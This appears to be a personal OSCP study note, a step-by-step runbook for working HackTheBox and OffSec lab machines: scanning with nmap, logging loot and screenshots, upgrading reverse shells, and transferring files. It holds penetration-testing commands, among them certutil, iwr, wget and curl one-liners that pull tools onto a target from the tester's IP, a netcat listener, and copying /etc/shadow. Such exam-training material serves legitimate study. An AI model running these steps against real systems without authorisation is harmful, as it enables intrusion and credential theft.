# OSCP Habits — Screenshot & Loot
> This cue is a compact reminder. For the full workflow, see [[RUNBOOK V2/Index]].
## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]

*Follow this file in order, every box, every time. The habits here exist because "I'll screenshot that later" and "I'll note that down" are how people lose flags and fail exam reports. Read each step, type the command, check the expected output, then move on.*

---

## Before you do anything: is your VPN up?

Open a terminal and type:

```bash
ip a show tun0
```

You should see output like:

```
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> ...
    inet 10.10.14.5/23 ...
```

That `10.10.x.x` address is your VPN IP -- you'll need it constantly. If instead you get:

```
Device "tun0" does not exist.
```

Your VPN is not connected. Go connect OpenVPN first, then come back here. There's no point scanning without the tunnel.

---

## Step 1 — Load your shell functions

Your helper commands (`boxstart`, `loot`, `shot`, etc.) are defined in `~/.zshrc`. In a normal terminal they load automatically, but if you type `boxstart` and get `command not found`, run this:

```bash
source ~/.zshrc
```

You won't see any output -- that's normal. It just reloads your config. After that, all the commands below will work.

You only need to do this if the commands aren't working. Most of the time you can skip straight to Step 2.

---

## Step 2 — Start the box

This single command sets up everything for a new target. Replace `Sea` with the actual box name and `10.10.11.28` with the actual IP:

```bash
boxstart Sea 10.10.11.28 htb
```

The third argument is the platform. Use `htb` for HackTheBox, `offsec` for OffSec labs, `thm` for TryHackMe. If you leave it out, it defaults to `htb`.

When it runs, you'll see something like:

```
[box] Sea started
BoxName=Sea        BoxIP=10.10.11.28
LocalIP=10.10.14.5
BoxDir=/home/kali/Platforms/HackTheBox/Sea
```

**Check `LocalIP`.** It should be your `tun0` VPN address -- something like `10.10.14.x` for HTB or `192.168.x.x` for OffSec. If it shows your LAN IP instead, your VPN isn't up (go back to the VPN check above).

After this command runs, you'll notice your terminal has automatically `cd`'d into `~/Platforms/HackTheBox/Sea/`. That's your working directory for this box. All your nmap output, loot, screenshots, and exploits will live here.

**What `boxstart` created for you:**

```
~/Platforms/HackTheBox/Sea/
├── nmap/          ← scan output goes here
├── loot/          ← creds, hashes, flags, keys
├── exploits/      ← exploits you download or write
├── screenshots/   ← every shot command saves here
├── www/           ← files you want to serve to the target
├── Sea.log        ← your command history for this box
└── .env           ← all your variables, saved to disk
```

It also wrote `~/.current_box` so any new terminal you open will automatically know you're working on Sea.

**About logging:** from this point on, every command you type is automatically logged to `$BoxDir/Sea.log` -- you don't have to do anything. This is handled by a `preexec` hook in `.zshrc` that fires before every command and writes it (with a timestamp) to the log. You'll never lose track of what you ran.

That log captures **commands only**, not the output they print. If you also want to capture terminal output -- for example, so you can read back exactly what nmap or linpeas printed -- run this in that terminal:

```bash
htblog
```

No argument needed when a box is loaded. It appends output capture on top of the existing command log. Type `exit` to stop capturing output (command logging keeps going regardless). Note that the captured output will contain ANSI colour codes -- if you want a clean version to read later:

```bash
ansifilter -i $BoxDir/Sea.log -o $BoxDir/Sea_clean.log
```

For most boxes you won't need `htblog` at all -- screenshots cover the output that matters. Use it when you're doing something methodical where you want a full record (e.g. a long enumeration phase you want to replay).

> 📸 Take a screenshot right now:
> ```bash
> shot box-started
> ```
> Capture the terminal showing BoxIP and LocalIP. This confirms your setup is correct.

---

## Step 3 — Start the full TCP port scan

You're in `~/Platforms/HackTheBox/Sea/`. Run this:

```bash
nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP
```

A note on the variables: `$BoxName` and `$BoxIP` were set by `boxstart`, so you don't need to type the actual box name or IP. They're already there.

The `-oA` flag saves results in three formats (`.nmap`, `.gnmap`, `.xml`) to your `nmap/` folder. This takes 2-4 minutes depending on the target.

While that's running, **open a second terminal** (Ctrl+Alt+T, or however you normally open terminals).

---

## Step 4 — Start the UDP scan in the second terminal

When you open the second terminal, you should see:

```
[auto] box: Sea
```

That means it auto-loaded the box. All your variables are available here too -- `$BoxIP`, `$BoxName`, `$BoxDir`, everything. No setup needed.

If you don't see that message, type:

```bash
boxload Sea
```

Now run the UDP scan:

```bash
nmap -sU --top-ports 100 -oA nmap/${BoxName}_udp $BoxIP
```

UDP scans are slow -- this one will take a while. Leave it running and go back to the first terminal.

---

## Step 5 — Run the service scan

Back in terminal 1, when the full TCP scan finishes, you'll see a summary like:

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8080/tcp  open  http-alt
```

Copy those port numbers and run a service scan on them:

```bash
nmap -sC -sV -p 22,80,8080 -oA nmap/${BoxName}_services $BoxIP
```

Replace `22,80,8080` with whatever ports you actually found. The `-sC` flag runs default scripts and `-sV` fingerprints the versions. This output is where you'll find software versions, banners, and sometimes credentials in plain text.

When this finishes, you'll see version info and script output for each port. Read it carefully.

> 📸 Screenshot the full TCP scan:
> ```bash
> shot nmap-allports
> ```
> Scroll up so all open ports are visible, then take it.

> 📸 Screenshot the service scan:
> ```bash
> shot nmap-services
> ```
> This one should show the versions and any script output.

---

## Step 6 — Write your notes

Before you start poking any service, open a scratch notes file:

```bash
nano $BoxDir/notes.md
```

Write down (in whatever format works for you -- bullet points, sentences, doesn't matter):
- Every open port and what's on it
- Every software version you can see (potential CVEs)
- Every username you spotted anywhere
- Every hostname or internal IP mentioned
- Anything you noticed but haven't investigated yet
- Anything you tried that didn't work (so you don't try it again)

The habit is: **if you notice something, write it down immediately, before you do anything else**. Your brain will lie to you and say you'll remember it. You won't.

---

## Step 7 — Storing credentials and loot as you find them

The second you find a username, password, hash, flag, SSH key, or interesting file -- store it. One command. Before you do anything else with it.

**Found a username and password:**

```bash
loot cred admin Password123!
```

**Found an NTLM hash:**

```bash
loot hash john aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

**Got the user flag:**

```bash
loot flag user d41d8cd98f00b204e9800998ecf8427e
```

**Got root / SYSTEM flag:**

```bash
loot flag root 098f6bcd4621d373cade4e832627b4f6
```

**Found an SSH private key:**

```bash
loot key /path/to/id_rsa
```

It copies the key to `loot/` and applies `chmod 600` automatically.

**Found an interesting config file:**

```bash
loot file /etc/shadow
```

Everything lands in `$BoxDir/loot/` with a timestamp. To check what you've collected at any point:

```bash
cat $BoxDir/loot/creds.txt
cat $BoxDir/loot/hashes.txt
cat $BoxDir/loot/flags.txt
ls $BoxDir/loot/
```

**Also save credentials to your session variables** so you can use them in commands without retyping:

```bash
boxset Username admin
boxset Password Password123!
```

After that, `$Username` and `$Password` are available in any command:

```bash
evil-winrm -i $BoxIP -u $Username -p $Password
smbclient //$BoxIP/share -U $Username%$Password
ssh $Username@$BoxIP
```

These variables save to `.env` on disk, so if you close the terminal and come back later, `boxload Sea` restores them all.

---

## Step 8 — Taking screenshots

Use the `shot` command -- it saves directly to `$BoxDir/screenshots/` with a `.png` extension. You just give it a name:

```bash
shot nmap-allports
```

That saves `~/Platforms/HackTheBox/Sea/screenshots/nmap-allports.png`.

**Take a screenshot before you move on.** The moment that terminal output scrolls away, or that window closes, is the moment you'll wish you had the screenshot. The report requires evidence for every finding -- you cannot go back and recreate it.

Here's the full list of moments that need a screenshot, and the exact command name to use:

| When | Command | What must be visible in the shot |
|------|---------|----------------------------------|
| After `boxstart` | `shot box-started` | BoxIP and LocalIP both showing |
| Full TCP scan done | `shot nmap-allports` | All open ports in the output |
| Service scan done | `shot nmap-services` | Version info and script output |
| Any significant finding | `shot <service>-<finding>` e.g. `shot http-admin-panel` | The finding in context |
| Shell landed | `shot foothold` | `whoami` + `id` + `hostname` all in one frame |
| User flag grabbed | `shot user-flag` | The `cat local.txt` output |
| Found the PrivEsc route | `shot privesc-finding` | The vulnerable thing highlighted |
| PrivEsc command ran | `shot privesc-exploit` | The command and its result |
| Root / SYSTEM shell | `shot root-shell` | `whoami` showing `root` or `nt authority\system` |
| Root flag grabbed | `shot root-flag` | The `cat proof.txt` output |
| OSCP proof (exam) | `shot PROOF-Sea` | `whoami` + `hostname` + flag **all in one frame** |

**For the OSCP exam proof shot specifically:** before you take it, run:

```bash
proof linux
# or
proof windows
```

It prints the exact one-liner to paste into the target shell. Run that command on the target, then screenshot the output. The OSCP marking requires all three (whoami, hostname, flag) visible together in one frame.

---

## Step 9 — When a shell lands

The moment a reverse shell connects to your listener, do these steps **before anything else**. A raw shell is fragile -- the wrong keystroke can kill it.

### Linux shell

**Step 1: Upgrade the shell.** Type this exactly:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

If you get `python3: command not found`, try `python` instead. If neither works, try:

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

**Step 2: Press Ctrl+Z.** The shell goes to the background and you'll see `[1]+  Stopped` in your terminal. That's expected.

**Step 3: Type this in your own terminal** (not the target):

```bash
stty raw -echo; fg
```

**Step 4: Press Enter twice.** Your shell should now be fully interactive -- you'll have arrow keys, tab completion, and Ctrl+C won't kill the connection.

**Step 5: Set the terminal type:**

```bash
export TERM=xterm
```

**Step 6: Confirm who you are and where you are:**

```bash
whoami && id && hostname && ip a
```

You'll see your username, your groups, the hostname, and the network interfaces.

> 📸 Take the foothold screenshot now, before doing anything else:
> ```bash
> shot foothold
> ```
> Scroll up slightly so `whoami`, `id`, and `hostname` are all visible.

**Step 7: Quick orientation:**

```bash
uname -a                            # kernel version
cat /etc/os-release                 # distro and version
cat /etc/passwd | grep -v nologin   # real user accounts
ls /home/                           # other users' home directories
```

---

### Windows shell

**Step 1: Confirm who you are:**

```cmd
whoami /all
hostname
ipconfig
```

> 📸 Take the foothold screenshot:
> ```bash
> shot foothold
> ```

**Step 2: Quick orientation:**

```cmd
systeminfo
net user
net localgroup administrators
```

---

## Step 10 — Opening more terminals mid-box

Any new terminal you open will show:

```
[auto] box: Sea
```

And you'll be in your box directory with all variables loaded. No setup required.

If for any reason that doesn't happen (non-interactive shell, marker got deleted, you're in tmux), just type:

```bash
boxload Sea
```

---

## Step 11 — Transferring files to the target

**The easy way -- `transfer` does everything:**

```bash
transfer exploits/winpeas.exe
```

You'll immediately see:

```
URL:         http://10.10.14.5:80/winpeas.exe

PowerShell:  iwr http://10.10.14.5:80/winpeas.exe -o winpeas.exe
certutil:    certutil -urlcache -split -f http://10.10.14.5:80/winpeas.exe winpeas.exe
wget:        wget http://10.10.14.5:80/winpeas.exe
curl:        curl http://10.10.14.5:80/winpeas.exe -o winpeas.exe
```

Copy the right download command for your target shell, paste it into the target, and wait for it to download. Then press Ctrl+C in your terminal to stop the server.

To serve on a different port (useful if port 80 is blocked):

```bash
transfer exploits/winpeas.exe 8080
```

**If you want to serve multiple files:** drop them all into `$BoxDir/www/` and then run:

```bash
www
```

That starts a server on port 80 serving everything in the `www/` directory. Ctrl+C to stop.

**Starting a reverse shell listener:**

```bash
listener           # listens on $Port (default 4444)
listener 9001      # listens on port 9001
```

When a shell connects, you'll see the connection in this terminal -- immediately go to Step 9 to upgrade it.

---

## Step 12 — Updating variables as you discover more

Every time you find a new credential, port, or hostname, update your variables immediately:

```bash
boxset Username john
boxset Password Summer2024!
boxset Port 5985
```

These save to `.env` so they survive terminal restarts. Use them:

```bash
evil-winrm -i $BoxIP -u $Username -p $Password
crackmapexec smb $BoxIP -u $Username -p $Password
ssh $Username@$BoxIP -p $Port
```

---

## End of Box — Pre-Report Checklist

Before you start writing the report, go through this list. A missing screenshot is not something you can add later.

**Screenshots -- check each one exists in `$BoxDir/screenshots/`:**

```bash
ls $BoxDir/screenshots/
```

- [ ] `box-started.png` -- BoxIP and LocalIP confirmed
- [ ] `nmap-allports.png` -- all open ports visible
- [ ] `nmap-services.png` -- versions and script output
- [ ] At least one screenshot per significant finding
- [ ] `foothold.png` -- `whoami` + `id` + `hostname` in one frame
- [ ] `user-flag.png` -- flag content visible
- [ ] `privesc-finding.png` -- the vulnerable thing
- [ ] `privesc-exploit.png` -- the command that elevated you
- [ ] `root-shell.png` -- `whoami` → root or SYSTEM
- [ ] `root-flag.png` -- flag content visible
- [ ] `PROOF-Sea.png` (or your box name) -- `whoami` + `hostname` + flag all visible in one frame

**Loot:**

- [ ] Both flags are in `loot/flags.txt` (`cat $BoxDir/loot/flags.txt`)
- [ ] Any creds found are in `loot/creds.txt`
- [ ] Any hashes found are in `loot/hashes.txt`
- [ ] Any SSH keys are in `loot/`

**Knowledge:**

- [ ] Every technique you used is represented in your notes
- [ ] Any tool you used that's not in Modern Tooling has been noted to add
- [ ] Any non-obvious command is noted to add to Command Breakdowns

Then copy [[Box Report Template]] and fill it in while it's fresh.

---

## End of Box — Vault Feedback Loop

*Do this after the report, while the box is still fresh. This is what makes every box improve the vault.*

**Module notes -- Related Boxes:**
- [ ] Open every module note whose technique you used on this box
- [ ] Add the box to its `## 🎯 Related Boxes to Practice` section with: box name, platform, why it's relevant to that technique, and a wikilink stub `[[BoxName]]` for when the writeup is written
- [ ] Be specific: "HTTP file upload bypass" not just "web"

**MASTER BOX LIST:**
- [ ] Add a row to `[[MASTER BOX LIST]]`: box name, platform, OS, difficulty, techniques used, module cross-refs
- [ ] This is the index that lets you search "what boxes have DLL hijacking?" later

**Runbook stage notes -- `box_sources`:**
- [ ] Every runbook stage note you used on this box should have this box added to its `box_sources:` frontmatter
- [ ] `box_sources:` tracks which real boxes informed each stage note. It's how stage notes grow from one-box examples into multi-box patterns over time.
- [ ] Format: `box_sources: [clamAV, Sea, <new_box>]` -- just append
- [ ] If a stage note doesn't exist yet, note it in the Master Index so it gets built next time

**Back-fill new patterns:**
- [ ] If you hit a technique variant not in the relevant stage note (e.g. a new auth bypass or a different CMS), add it as a new row in that stage note's command table
- [ ] If the stage note doesn't exist yet and you did something novel, create it now while it's fresh

---

## Quick Reference -- All Box Commands

Once you know what the commands do, this table is the fast lookup:

| Command | What it does |
|---|---|
| `boxstart <Name> <IP> [htb\|offsec\|thm]` | First time on a box -- creates dirs, writes .env, starts log |
| `boxload [Name]` | Reconnect in a new terminal -- restores all vars, cds into box dir |
| `boxdone` | Clear current-box marker -- stops auto-loading on new terminals |
| `boxset <VAR> <value>` | Update a variable live and save it to .env |
| `loot cred <user> <pass>` | Save credential → `loot/creds.txt` |
| `loot hash <user> <hash>` | Save hash → `loot/hashes.txt` |
| `loot flag <user\|root> <value>` | Save flag → `loot/flags.txt` |
| `loot key <path>` | Copy SSH key → `loot/` (chmod 600 applied automatically) |
| `loot file <path>` | Copy any file → `loot/` |
| `shot <name>` | Screenshot → `screenshots/<name>.png` |
| `www [port]` | HTTP server from `www/` dir (default port 80) |
| `transfer <file> [port]` | Copy file to `www/`, print download one-liners, start server |
| `listener [port]` | `nc -lnvp` on `$Port` (default 4444) |
| `nocolor <command>` | Strip ANSI colour codes from any tool's output |
| `proof linux\|windows` | Print proof screenshot command to paste into target shell |
| `htblog` | Capture terminal output to the box log (commands are already logged automatically -- this adds output on top) |

---

## Module Cross-Reference

When you hit a technique on a box, these modules have the detail:

| Area | Module |
|------|--------|
| Recon / enumeration | [[06. Information Gathering\|Information Gathering]], [[07. Vulnerability Scanning\|Vulnerability Scanning]] |
| Web app attacks | [[08. Introduction to Web Application Attacks\|Introduction to Web Application Attacks]], [[09. Common Web Application Attacks\|Common Web Application Attacks]] |
| SQLi | [[10. SQL Injection Attacks\|SQL Injection Attacks]] |
| File / client attacks | [[12. Client-Side Attacks\|Client-Side Attacks]] |
| Public exploits | [[13. Locating Public Exploits\|Locating Public Exploits]], [[14. Fixing Exploits\|Fixing Exploits]] |
| AV evasion | [[15. Antivirus Evasion\|Antivirus Evasion]] |
| Passwords / hashes | [[16. Password Attacks\|Password Attacks]] |
| Linux privesc | [[18. Linux Privilege Escalation\|Linux Privilege Escalation]] |
| Windows privesc | [[17. Windows Privilege Escalation\|Windows Privilege Escalation]] |
| Pivoting | [[19. Port Redirection and SSH Tunneling\|Port Redirection and SSH Tunneling]], [[20. Tunneling Through Deep Packet Inspection\|Tunneling Through Deep Packet Inspection]] |
| Active Directory | [[22. Active Directory Introduction and Enumeration\|Active Directory Introduction and Enumeration]], [[23. Attacking Active Directory Authentication\|Attacking Active Directory Authentication]], [[24. Lateral Movement in Active Directory\|Lateral Movement in Active Directory]] |
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for reverse-shell selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for practical walkthrough searches
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
